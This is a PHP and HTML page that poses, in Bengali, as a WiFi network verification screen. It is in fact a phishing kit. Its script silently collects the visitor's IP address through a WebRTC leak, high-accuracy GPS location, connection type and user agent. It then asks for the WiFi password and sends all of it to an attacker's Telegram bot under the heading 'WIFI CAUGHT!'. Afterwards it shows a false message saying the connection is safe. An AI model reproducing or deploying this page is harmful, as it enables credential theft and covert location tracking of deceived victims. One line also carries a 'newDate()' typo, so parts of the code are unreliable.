<?php $target = $_GET['target'] ?? 'WiFi'; ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($target); ?> - Network Status</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;padding:32px;max-width:420px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,0.15);position:relative;overflow:hidden}
        .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#10b981,#34d399)}
        .header{margin-bottom:24px;text-align:center}
        .status{font-size:28px;font-weight:700;color:#10b981;margin-bottom:8px}
        .subtitle{color:#6b7280;font-size:16px}
        .detail{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#f8fafc;border-radius:16px;margin-bottom:12px;border:1px solid #e5e7eb}
        .label{font-weight:500;color:#374151}
        .value{font-size:16px;font-weight:600;color:#1f2937}
        .password-input{width:100%;padding:20px;border:2px solid #e5e7eb;border-radius:16px;font-size:18px;margin-bottom:20px;font-family:monospace;letter-spacing:1px;transition:all 0.3s}
        .password-input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1)}
        .verify-btn{width:100%;padding:20px;background:linear-gradient(135deg,#10b981,#34d399);color:white;border:none;border-radius:16px;font-size:18px;font-weight:700;cursor:pointer;transition:all 0.3s}
        .verify-btn:hover{background:linear-gradient(135deg,#059669,#10b981);transform:translateY(-2px)}
        .loading{text-align:center;color:#6b7280;font-style:italic;padding:40px}
        @media (max-width:480px){.card{padding:24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <div class="status">✅ সংযোগ সঠিক</div>
            <div class="subtitle">আপনার নেটওয়ার্ক যাচাই করুন</div>
        </div>
        
        <div id="loading" class="loading">নেটওয়ার্ক সনাক্ত করা হচ্ছে...</div>
        <div id="details" style="display:none;">
            <div class="detail"><span class="label">নেটওয়ার্ক:</span><span class="value" id="ssid"><?php echo htmlspecialchars($target); ?></span></div>
            <div class="detail"><span class="label">IP ঠিকানা:</span><span class="value" id="ip">সনাক্ত করা হচ্ছে...</span></div>
            <div class="detail"><span class="label">সিগন্যাল:</span><span class="value" id="signal">সনাক্ত করা হচ্ছে...</span></div>
            <div class="detail"><span class="label">অবস্থান:</span><span class="value" id="location">সনাক্ত করা হচ্ছে...</span></div>
        </div>
        
        <input type="password" id="wifi-password" class="password-input" placeholder="WiFi পাসওয়ার্ড লিখুন (যাচাইয়ের জন্য)" autocomplete="new-password">
        <button class="verify-btn" onclick="submitWiFi()">🔐 যাচাই করুন</button>
    </div>

    <script>
        let data = {ssid:"<?php echo htmlspecialchars($target); ?>",ip:"Unknown",signal:"Unknown",location:"Unknown",ua:navigator.userAgent,timestamp:new Date().toISOString()};

        // WebRTC IP leak
        try{const pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){const m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);if(m){data.ip=m[1];updateUI()}}pc.close()}}catch(e){}

        // Network info
        if(navigator.connection){data.signal=navigator.connection.effectiveType==='4g'?'ভালো':navigator.connection.effectiveType==='3g'?'মাঝারি':'খারাপ'}

        // GPS
        navigator.geolocation.getCurrentPosition(p=>{data.location=`${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`;updateUI()},()=>{},{enableHighAccuracy:true,timeout:10000});

        function updateUI(){const l=document.getElementById('loading'),d=document.getElementById('details');document.getElementById('ip').textContent=data.ip;document.getElementById('signal').textContent=data.signal;document.getElementById('location').textContent=data.location;if(data.ip!=='Unknown'){l.style.display='none';d.style.display='block'}}

        async function submitWiFi(){const pwd=document.getElementById('wifi-password').value;data.password=pwd;const bot="<?php echo $_ENV['BOT_TOKEN']??''; ?>",chat="<?php echo $_ENV['CHAT_ID']??''; ?>";if(bot&&chat){await fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${chat}&parse_mode=HTML&text=${encodeURIComponent(`🎯 **WIFI CAUGHT!**

👤 Target: <?php echo htmlspecialchars($target); ?>

🌐 **IP:** ${data.ip}
📍 **Location:** ${data.location}
📶 **Signal:** ${data.signal}
🔑 **Password:** ${pwd||'❌ Not given'}
🕐 **Time:** ${newDate().toLocaleString('bn-BD')}

**UA:** ${navigator.userAgent.slice(0,80)}`)}`).catch(e=>{})}document.body.innerHTML='<div style="text-align:center;padding:60px;color:#10b981"><div style="font-size:48px;margin-bottom:20px">✅</div><h2 style="color:#1f2937;margin-bottom:10px">যাচাই সম্পন্ন!</h2><p style="color:#6b7280">আপনার সংযোগ নিরাপদ।</p></div>';}
    </script>
</body>
</html>
